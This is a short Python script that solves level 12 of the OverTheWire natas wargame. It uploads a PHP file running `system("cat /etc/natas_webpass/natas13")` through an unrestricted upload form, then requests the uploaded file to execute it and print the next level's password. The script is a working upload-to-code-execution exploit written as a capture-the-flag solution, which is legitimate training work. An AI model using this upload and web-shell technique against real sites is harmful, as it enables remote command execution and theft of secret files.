"""
Help script to resolve natas challenge #12
"""
import requests
import json
import re

level = 'natas12'
url = 'http://{}.natas.labs.overthewire.org'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
We can upload anything we want, so let's try to upload a php file :)
"""

response = requests.post(url, auth=auth,
                         data={'filename': 'something.php'},
                         files={'uploadedfile': b'<?php system("cat /etc/natas_webpass/natas13"); ?>'})
# The response contains the name of the uploaded file.
match = re.search(r'"(upload/\w+\.php)"', response.text)
filename = match.groups()[0]
print(filename)

response = requests.get('/'.join([url, filename]), auth=auth)
print(response.text)
